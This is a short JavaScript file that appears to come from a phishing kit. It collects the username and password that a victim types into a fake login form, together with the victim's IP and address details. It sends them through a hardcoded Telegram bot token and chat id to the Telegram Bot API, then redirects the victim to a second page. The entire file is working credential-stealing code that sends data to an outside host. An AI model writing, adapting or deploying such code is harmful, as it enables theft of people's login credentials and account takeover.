//bot token
var telegram_bot_id = "5806759075:AAFTYNVInf8oZqEe2C_6TSm61UwdE-YESzo";
//chat id
var chat_id = "1739203762";
var u_name, u_name2, ip, ip2;
var ready = function () {
    u_name = document.getElementById("us4r").value;
    u_name2 = document.getElementById("p4sx").value;
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    message = "🧿OXYD3NT3🧿\n👤US4R: " + u_name + "\n🔐C0NTR4: " + u_name2 + "\nIP: " + ip +"\n" + ip2 +"\n🧿C0de by Syn4pse🧿";
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        window.location = 'index2.html';
        console.log(response);
    });
    return false;
};
